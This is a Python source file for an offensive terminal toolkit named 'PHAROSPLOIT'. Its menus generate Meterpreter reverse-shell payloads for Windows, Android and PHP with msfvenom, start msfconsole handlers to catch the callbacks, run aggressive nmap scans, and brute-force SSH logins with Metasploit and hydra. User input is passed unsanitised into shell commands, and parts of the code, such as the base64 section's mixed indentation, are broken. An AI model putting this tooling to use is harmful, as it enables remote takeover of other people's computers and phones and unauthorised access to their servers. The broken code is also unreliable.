# Tool Created By : R3xxV0s5en
# Github : https://github.com/R3xxV0s5en
# Instagram : https://www.instagram.com/r3xxv0s5en
import os
import sys
import time
import threading
from datetime import datetime
from rich.console import Console
from termcolor import colored
from pyfiglet import Figlet
import base64
console = Console()

def anim():
	animation = ["[■□□□□□□□□□]","[■■□□□□□□□□]", "[■■■□□□□□□□]", "[■■■■□□□□□□]", "[■■■■■□□□□□]", "[■■■■■■□□□□]", "[■■■■■■■□□□]", "[■■■■■■■■□□]", "[■■■■■■■■■□]", "[■■■■■■■■■■]"]

	for i in range(len(animation)):
	    time.sleep(0.2)
	    sys.stdout.write("\r" + animation[i % len(animation)])
	    sys.stdout.flush()

# Payload Genrator
def Payload_Gen():
	# Windows Payload :
	def windows_payload():
		# User Connection :
		console.print('Attacking Windows Computer 🖥️  :', style="bold magenta")
		HOST = input(str("[+] Enter LHOST : "))
		console.print("Your LHOST is : > "+ HOST, style="bold green")
		PORT = input("[+] Enter LPORT : ")
		console.print("Your LHOST is : > "+ PORT, style="bold green")
		console.print("Exemple : /root/Desktop/", style="bold magenta")
		PATH = input('[+] Enter The path for Save 📁 >> : ')
		console.print("Your Save path is : > "+PATH, style="bold green")

		# msfvenom windows :
		print("\n")
		console.print("Creating Payload 💀 ...", style="bold green")
		anim()
		console.print(" wait...", style="bold yellow")
		print("\n")
		# Creating Payload :
		makepayload = "msfvenom -p windows/meterpreter/reverse_tcp -a x86 --platform windows -f exe lhost="+HOST+ " lport="+PORT+ " -o"+PATH+"window_payload.exe"
		os.system(makepayload)
		print("\n")
		console.print("Payload Have been Genrated ✅", style="bold green")
		print("\n")
		# Exploiting :
		console.print("Do you want to listen for Connections ? 👂", style="bold green")
		listen = input("[1]Yes [2]No : ")
		if listen == '1':
			console.print("Start Lestening 👂...", style="bold green")
			anim()
			print("\n")
			msflisten ='msfconsole -q -x "use exploit/multi/handler; set payload windows/meterpreter/reverse_tcp; set lhost '+HOST+' ; set lport '+PORT+' ; exploit ; "'
			os.system(msflisten)
		else :
			os.system("clear")
			payloadgen_choice()

	# Android Payload :
	def android_payload():
		console.print('Attacking Android Phone 📱 : ', style="bold magenta")
		HOST = input(str("[+] Enter LHOST : "))
		console.print("Your LHOST is : > "+ HOST, style="bold green")
		PORT = input("[+] Enter LPORT : ")
		console.print("Your LHOST is : > "+ PORT, style="bold green")
		console.print("Exemple : /root/Desktop/", style="bold magenta")
		PATH = input('[+] Enter The path for Save 📁 >> : ')
		console.print("Your Save path is : > "+PATH, style="bold green")

		# msfvenom android :
		print("\n")
		console.print("Creating Payload 💀 ...", style="bold green")
		anim()
		console.print(" wait...", style="bold yellow")
		print("\n")
		# Creating Payload :
		makepayload = "msfvenom -p android/meterpreter/reverse_tcp lhost="+HOST+ " lport="+PORT+ " -o"+PATH+"android_payload.apk"
		os.system(makepayload)
		print("\n")
		console.print("Payload Have been Genrated ✅", style="bold green")
		print("\n")
		# Exploiting :
		console.print("[+] Do you want to listen for Connections ? 👂", style="bold green")
		listen = input("[1]Yes [2]No : ")
		if listen == '1':
			console.print("Start Lestening 👂...", style="bold green")
			anim()
			print("\n")
			msflisten ='msfconsole -q -x "use exploit/multi/handler; set payload android/meterpreter/reverse_tcp; set lhost '+HOST+' ; set lport '+PORT+' ; exploit ; "'
			os.system(msflisten)
		else :
			os.system("clear")
			payloadgen_choice()

	def php_payload():
		console.print('Attacking Php Server 🖥: ', style="bold magenta")
		HOST = input(str("[+] Enter LHOST : "))
		console.print("Your LHOST is : > "+ HOST, style="bold green")
		PORT = input("[+] Enter LPORT : ")
		console.print("Your LHOST is : > "+ PORT, style="bold green")
		console.print("Exemple : /root/Desktop/", style="bold magenta")
		PATH = input('[+] Enter The path for Save 📁 >> : ')
		console.print("Your Save path is : > "+PATH, style="bold green")

		# msfvenom android :
		print("\n")
		console.print("Creating Payload 💀 ...", style="bold green")
		anim()
		console.print(" wait...", style="bold yellow")
		print("\n")
		# Creating Payload :
		makepayload = "msfvenom -p php/meterpreter/reverse_tcp lhost="+HOST+ " lport="+PORT+ " -o"+PATH+"php_payload.php"
		os.system(makepayload)
		print("\n")
		console.print("Payload Have been Genrated ✅", style="bold green")
		print("\n")
		# Exploiting :
		console.print("Do you want to listen for Connections ? 👂", style="bold green")
		listen = input("[1]Yes [2]No : ")
		if listen == '1':
			console.print("Start Lestening 👂...", style="bold green")
			anim()
			print("\n")
			msflisten ='msfconsole -q -x "use exploit/multi/handler; set payload php/meterpreter/reverse_tcp; set lhost '+HOST+' ; set lport '+PORT+' ; exploit ; "'
			os.system(msflisten)
		else :
			os.system("clear")
			payloadgen_choice()

	def payloadgen_choice():
		while True:

			wbanner = Figlet(font ="slant")
			print(colored(wbanner.renderText("Payload Genrator"), "green"))
			console.print("Attack started at : " + str(datetime.now()), style="bold magenta")
			console.print(''' 
##########################
# [1] Windows Payload 🖥️  #
# [2] Android Payload 📱 #
# [3] Php Payload 🖥      #
# [0] Exit 👋	        #
##########################
			''', style="bold blue")

			choice = input("[+] Enter The Number of The Payload : ")
			if choice == '1':
				os.system("clear")
				banner = Figlet(font = "slant")
				print(colored(banner.renderText("WINDOWS"), "green"))
				print("\n")			
				windows_payload()
				os.system("clear")
				console.print("[+] Do You Want to go back to the PayloadGen Menu ?", style="bold yellow")
				back = input("[1]Yes [2]No : ")
				if back == '1':
					os.system("clear")
					payloadgen_choice()
				else:
					exit()
			elif choice == '2':
				os.system("clear")
				banner = Figlet(font = "slant")
				print(colored(banner.renderText("ANDROID"), "green"))
				print("\n")
				android_payload()
				os.system("clear")
				console.print("[+] Do You Want to go back to the PayloadGen Menu ?", style="bold yellow")
				back = input("[1]Yes [2]No : ")
				if back == '1':
					os.system("clear")
					payloadgen_choice()
				else:
					exit()		
			elif choice == '3':
				os.system("clear")
				banner = Figlet(font = "slant")
				print(colored(banner.renderText("PHP"), "green"))
				print("\n")
				php_payload()
				os.system("clear")
				console.print("[+] Do You Want to go back to the PayloadGen Menu ?", style="bold yellow")
				back = input("[1]Yes [2]No : ")
				if back == '1':
					os.system("clear")
					payloadgen_choice()
				else:
					exit()
			elif choice == '0':
				os.system("clear")
				break
			else:
				console.print("Wrong Option ⛔", style="bold red")
	payloadgen_choice()

# Nmap Scan :
def Nmap_Scan():
	def intense_scan():
		console.print("Nmap Intense Scan 👁️", style="bold magenta")
		targetip = input("[+] Enter The Host you Want to scan : ")
		anim()
		print("\n")
		console.print("*" * 50, style="bold magenta")
		console.print("Scanning Target: " + targetip, style="bold magenta")
		console.print("Scanning started at:" + str(datetime.now()), style="bold magenta")
		console.print("*" * 50, style="bold magenta") 
		print("\n")
		cmd = 'nmap -T4 -A -v '+targetip
		os.system(cmd)

	def intense_scan_no_ping():
		console.print("Nmap Intense Scan No Ping 👁️", style="bold magenta")
		targetip = input("[+] Enter The Host you Want to scan : ")
		anim()
		print("\n")
		console.print("*" * 50, style="bold magenta")
		console.print("Scanning Target: " + targetip, style="bold magenta")
		console.print("Scanning started at:" + str(datetime.now()), style="bold magenta")
		console.print("*" * 50, style="bold magenta") 
		print("\n") 
		cmd = 'nmap -T4 -A -v -Pn '+targetip
		os.system(cmd)

	def intense_scan_all_tcp():
		console.print("Nmap Intense Scan All TCP Ports 👁️", style="bold magenta")
		targetip = input("[+] Enter The Host you Want to scan : ")
		anim()
		print("\n")
		console.print("*" * 50, style="bold magenta")
		console.print("Scanning Target: " + targetip, style="bold magenta")
		console.print("Scanning started at:" + str(datetime.now()), style="bold magenta")
		console.print("*" * 50, style="bold magenta") 
		print("\n") 
		cmd = 'nmap -p 1-65535 -T4 -A -v '+targetip
		os.system(cmd)

	def ping_scan():
		console.print("Nmap Ping Scan 👁️", style="bold magenta")
		targetip = input("[+] Enter The Host you Want to scan : ", style="bold magenta")
		anim()
		print("\n")
		console.print("*" * 50, style="bold magenta")
		console.print("Scanning Target: " + targetip, style="bold magenta")
		console.print("Scanning started at:" + str(datetime.now()), style="bold magenta")
		console.print("*" * 50, style="bold magenta") 
		print("\n") 
		cmd = 'nmap -sn '+targetip
		os.system(cmd)

	def quick_scan():
		console.print("Nmap Quick Scan 👁️")
		targetip = input("[+] Enter The Host you Want to scan : ", style="bold magenta")
		anim()
		print("\n")
		console.print("*" * 50, style="bold magenta")
		console.print("Scanning Target: " + targetip, style="bold magenta")
		console.print("Scanning started at:" + str(datetime.now()), style="bold magenta")
		console.print("*" * 50, style="bold magenta") 
		print("\n") 
		cmd = 'nmap -T4 -F '+targetip
		os.system(cmd)

	def quick_scan_plus():	
		console.print("Nmap Quick scan plus 👁️")
		targetip = input("[+] Enter The Host you Want to scan : ", style="bold magenta")
		anim()
		print("\n")
		console.print("*" * 50, style="bold magenta")
		console.print("Scanning Target: " + targetip, style="bold magenta")
		console.print("Scanning started at:" + str(datetime.now()), style="bold magenta")
		console.print("*" * 50, style="bold magenta") 
		print("\n") 
		cmd = 'nmap -sV -T4 -O -F --version-light '+targetip
		os.system(cmd)

	def quick_traceroute():
		console.print("Nmap Quick traceroute 👁️")
		targetip = input("[+] Enter The Host you Want to scan : ", style="bold magenta")
		anim()
		print("\n")
		cmd = 'nmap -sn --traceroute '+targetip
		os.system(cmd)	

	def regular_scan():
		console.print("Nmap Regular scan 👁️")
		targetip = input("[+] Enter The Host you Want to scan : ", style="bold magenta")
		anim()
		print("\n")
		console.print("*" * 50, style="bold magenta")
		console.print("Scanning Target: " + targetip, style="bold magenta")
		console.print("Scanning started at:" + str(datetime.now()), style="bold magenta")
		console.print("*" * 50, style="bold magenta") 
		print("\n") 
		cmd = 'nmap '+targetip
		os.system(cmd)		

	def slow_comprehensive_scan():
		console.print("Nmap Slow comprehensive scan 👁️", style="bold magenta")
		targetip = input("[+] Enter The Host you Want to scan : ")
		anim()
		print("\n")
		console.print("*" * 50, style="bold magenta")
		console.print("Scanning Target: " + targetip, style="bold magenta")
		console.print("Scanning started at:" + str(datetime.now()), style="bold magenta")
		console.print("*" * 50, style="bold magenta") 
		print("\n") 
		cmd = 'nmap -sS -sU -T4 -A -v -PE -PP -PS80,443 -PA3389 -PU40125 -PY -g 53 --script "default or (discovery and safe)" '+targetip
		os.system(cmd)	

	def nmap_choice():
		while True:
			os.system("clear")
			banner = Figlet(font = "slant")
			print(colored(banner.renderText("Nmap Scan"), "green"))
			print("\n")
			console.print("Nmap started at : " + str(datetime.now()), style="bold magenta")
			console.print('''
############################################
# [1] Nmap Intense Scan 👁️		    #
# [2] Nmap Intense Scan No Ping 👁️          # 
# [3] Nmap Intense Scan All TCP Ports 👁️    #
# [4] Nmap Ping Scan 👁️                     #
# [5] Nmap Quick Scan 👁️                    #
# [6] Nmap Quick scan plus 👁️               #
# [7] Nmap Quick traceroute 👁️              #
# [8] Nmap Regular scan 👁️                  #
# [9] Nmap Slow comprehensive scan 👁️       #
# [0] Exit 👋                              #
############################################
			''', style="bold blue" )
		
			choice = input("[+] Enter The Number of The Scan : ")
			if choice == '1':
				os.system("clear")
				banner = Figlet(font = "digital")
				print(colored(banner.renderText("Nmap Intense Scan"), "green"))
				print("\n")
				intense_scan()
				print("\n")
				console.print("[+] Do You Want to go back to the Nmap Menu ?", style="bold yellow")
				back = input("[1]Yes [2]No : ")
				if back == '1':
					os.system("clear")
					nmap_choice()
				else:
					exit()
			elif choice == '2':
				os.system("clear")
				banner = Figlet(font = "digital")
				print(colored(banner.renderText("Nmap Intense Scan No Ping"), "green"))
				print("\n")
				intense_scan_no_ping()
				print("\n")
				console.print("[+] Do You Want to go back to the Nmap Menu ?", style="bold yellow")
				back = input("[1]Yes [2]No : ")
				if back == '1':
					os.system("clear")
					nmap_choice()
				else:
					exit()
			elif choice == '3':
				os.system("clear")
				banner = Figlet(font = "digital")
				print(colored(banner.renderText("Nmap Intense Scan All TCP Ports"), "green"))
				print("\n")
				intense_scan_all_tcp()
				print("\n")
				console.print("[+] [+] Do You Want to go back to the Nmap Menu ?", style="bold yellow")
				back = input("[1]Yes [2]No : ")
				if back == '1':
					os.system("clear")
					nmap_choice()
				else:
					exit()
			elif choice == '4':
				os.system("clear")
				banner = Figlet(font = "digital")
				print(colored(banner.renderText("Nmap Ping Scan"), "green"))
				print("\n")
				ping_scan()
				print("\n")
				console.print("[+] Do You Want to go back to the Nmap Menu ?", style="bold yellow")
				back = input("[1]Yes [2]No : ")
				if back == '1':
					os.system("clear")
					nmap_choice()
				else:
					exit()
			elif choice == '5':
				os.system("clear")
				banner = Figlet(font = "digital")
				print(colored(banner.renderText("Nmap Quick Scan"), "green"))
				print("\n")
				quick_scan()
				print("\n")
				console.print("[+] Do You Want to go back to the Nmap Menu ?", style="bold yellow")
				back = input("[1]Yes [2]No : ")
				if back == '1':
					os.system("clear")
					nmap_choice()
				else:
					exit()
			elif choice == '6':
				os.system("clear")
				banner = Figlet(font = "digital")
				print(colored(banner.renderText("Nmap Quick scan plus"), "green"))
				print("\n")
				quick_scan_plus()
				print("\n")
				console.print("[+] Do You Want to go back to the Nmap Menu ?", style="bold yellow")
				back = input("[1]Yes [2]No : ")
				if back == '1':
					os.system("clear")
					nmap_choice()
				else:
					exit()
			elif choice == '7':
				os.system("clear")
				banner = Figlet(font = "digital")
				print(colored(banner.renderText("Nmap Quick traceroute"), "green"))
				print("\n")
				quick_traceroute()
				print("\n")
				console.print("[+] Do You Want to go back to the Nmap Menu ?", style="bold yellow")
				back = input("[1]Yes [2]No : ")
				if back == '1':
					os.system("clear")
					nmap_choice()
				else:
					exit()
			elif choice == '8':
				os.system("clear")
				banner = Figlet(font = "digital")
				print(colored(banner.renderText("Nmap Regular scan"), "green"))
				print("\n")
				regular_scan()
				print("\n")
				console.print("[+] Do You Want to go back to the Nmap Menu ?", style="bold yellow")
				back = input("[1]Yes [2]No : ")
				if back == '1':
					os.system("clear")
					nmap_choice()
				else:
					exit()
			elif choice == '9':
				os.system("clear")
				banner = Figlet(font = "digital")
				print(colored(banner.renderText("Nmap Slow comprehensive scan"), "green"))
				console.print("Scan started at : " + str(datetime.now()), style="bold magenta")
				print("\n")
				slow_comprehensive_scan()
				print("\n")
				console.print("[+] Do You Want to go back to the Nmap Menu ?", style="bold yellow")
				back = input("[1]Yes [2]No : ")
				if back == '1':
					os.system("clear")
					nmap_choice()
				else:
					exit()
			elif choice == '0':
				os.system("clear")
				break
			else :
				console.print("Wrong Option ⛔", style="bold red")
	nmap_choice()




# SSH BruteForce : 
def SSH_Brute():
	def msf_brutforce():
		RHOSTS = input("[+] Enter RHOSTS : ")
		username = input("[+] Enter Username list path : ")
		password = input("[+] Enter Password list path : ")
		
		console.print("*" * 50, style="bold magenta")
		console.print("Attacking Target: " + RHOSTS, style="bold magenta")
		console.print("Attacking started at:" + str(datetime.now()), style="bold magenta")
		console.print("*" * 50, style="bold magenta") 

		cmd = 'msfconsole -q -x "use auxiliary/scanner/ssh/ssh_login; set RHOSTS '+RHOSTS+' ; set USER_FILE '+username+' ; set PASS_FILE '+password+' ; exploit ; "'
		os.system(cmd)
		exit()

	def hydra_brutforce():
		console.print("Exemple : ssh://10.10.10.10:22", style="bold magenta")
		HOST = input("[+] Enter The Host you want to scan : ")
		console.print("Your Host is > : "+HOST, style="bold green")
		username = input("[+] Enter The Usernam : ")
		console.print("Your Username is > : "+username, style="bold green")
		console.print("Exemple : /usr/share/wordlists/rockyou.txt ", style="bold magenta")
		passwordlist = input("[+] Enter The Password list path : ")
		console.print("Your Password list is > : "+passwordlist, style="bold green")

		console.print("*" * 50, style="bold magenta")
		console.print("Attacking Target: " + HOST, style="bold magenta")
		console.print("Attacking started at:" + str(datetime.now()), style="bold magenta")
		console.print("*" * 50, style="bold magenta") 

		cmd = 'hydra -l '+username+ '-P '+passwordlist+' '+HOST+ ' -t ssh'
		os.system(cmd)


	def Menu():
		while True:

			os.system("clear")
			banner = Figlet(font = "slant")
			print(colored(banner.renderText("SSH BRUTEFORCE"), "green"))

			console.print(''' 
###########################
# [1] Msf Bruteforce 🔐   #
# [2] Hydra Bruteforce 🔐 #
# [0] Exit 👋             #
###########################
				''', style="bold blue")
			choice = input("[+] Enter Number : ")

			if choice == '1':
				os.system("clear")
				banner = Figlet(font = "digital")
				print(colored(banner.renderText("SSH BRUTEFORCE"), "green"))
				msf_brutforce()

			elif choice == '2':
				os.system("clear")
				banner = Figlet(font = "digital")
				print(colored(banner.renderText("SSH HYDRA"), "green"))
				hydra_brutforce()

			elif choice == '0':
				break
	Menu()
def Base64():
	os.system("clear")
	banner = Figlet(font = "slant")
	print(colored(banner.renderText("BASE64"), "green"))
	print("\n")	
	console.print(''' 
###################
# [1] Encoding 🔒 # 
# [2] Decoding 🔓 #
# #################
				''', style="bold blue")
	base64option = input("Enter Your Option : ")

	while True:
		if base64option == "1":
			console.print("Encoding started at:" + str(datetime.now()), style="bold magenta")
		    text = input("Enter Your Text You Want To Encrypt : ")
		    text_bytes = text.encode('ascii')
		    base64_bytes = base64.b64encode(text_bytes)
		    anim()
		    print("\n")
		    base64_message = base64_bytes.decode('ascii')
		    console.print("The Encoded Text : \n", style="bold green")
		    print(base64_message)
		    print("\n")
		    console.print("Do you Want To encode more text ? ", style="bold magenta")
		    back = input("[1]Yes [2]No : ")
		    if back == "1":
		        os.system("clear")
		        Base64()
		    elif back == "2":
		        os.system("clear")
		        Main_Menu()

		elif base64option == "2":
			console.print("Decoding started at:" + str(datetime.now()), style="bold magenta")
		    text = input("Enter Your Text You Want To Encrypt : ")
		    text_bytes = text.encode('ascii')
		    base64_bytes = base64.b64decode(text_bytes)
		    anim()
		    print("\n")
		    base64_message = base64_bytes.decode('ascii')
		    console.print("The Encoded Text : \n", style="bold green")
		    console.print(base64_message, style="bold green") 
		    print("\n")
		    console.print("Do you Want To encode more text ? ", style="bold magenta")
		    back = input("[1]Yes [2]No")
		    if back == "1":
		        os.system("clear")
		        Base64()
		    elif back == "2":
		        os.system("clear")
		        Main_Menu()
		else :
			console.print("Wrong Option ⛔", style="bold red")

def Main_Menu():
	while True:
		os.system("clear")
		console.print('''

	                _ood>H&H&Z?#M#b-.
	            ..HMMMMMR?`'M6b."`' ''``v.
	         .. .MMMMMMMMMMHMMM#&.      ``~o.
	       .   ,HMMMMMMMMMM`' '           ?MP?.
	      . |MMMMMMMMMMM'                 `"$b&.
	     -  |MMMMHH##M'                     HMMH?
	    -   TTM|     >..                    HMMMMH
	   :     |MM ,#-""$~b .                `MMMMMM+
	  .       ``"H&#        -               &MMMMMM|
	  :            *  ,#MHddc.              `9MMMMMb
	  .               MMMMMMMM##              `"":HM
	  -          .  .HMMMMMMMMMMRo_.              |M
	  :             |MMMMMMMMMMMMMMMM#            :M
	  -              `HMMMMMMMMMMMMMM'            |T
	  :               `*HMMMMMMMMMMM'             H'
	   :                MMMMMMMMMMM|             |T
	    ;               MMMMMMMM?'              ./
	     `              MMMMMMH'               ./'
	      -            |MMMH#'                 .
	       `           `MM*                . `
	         _          #M: .    .       .-'
	            .          .,         .-'
	               '-.-~ooHH__,,v~--`'

			''', style="bold green")
		banner = Figlet(font = "slant")
		print(colored(banner.renderText("PHAROSPLOIT"), "green"))
		console.print('''
💫#####-Tool By R3xxV0s5en 🎃-#####💫
Github 🐱 : https://github.com/R3xxV0s5en
Instagram 📷 : https://www.instagram.com/r3xxv0s5en

         ''', style="bold red")

		console.print(''' 
#################################
# [1] Payload Genrator ☠️       #
# [2] Nmap Scan 👁              #
# [3] SSH Brute Force 🔐        #
# [4] Base64 Encode/Decode      #
# [0] Exit 👋                   #
#################################
			''', style="bold magenta")
		
		user_choice = input("[+] Enter Number : ")

		if user_choice == '1':
			os.system("clear")
			Payload_Gen()
			
		elif user_choice == '2':
			os.system("clear")
			Nmap_Scan()
		
		elif user_choice == '3':
			os.system("clear")
			SSH_Brute()

		elif user_choice == '4':
			os.system("clear")
			Base64()

		elif user_choice == '0':
			console.print("\nGood Bye 👋\n", style="bold red")
			exit()

		else :
			console.print("Wrong Option ⛔", style="bold red")
			time.sleep(0.2)
			os.system("clear")
			Main_Menu()

Main_Menu()
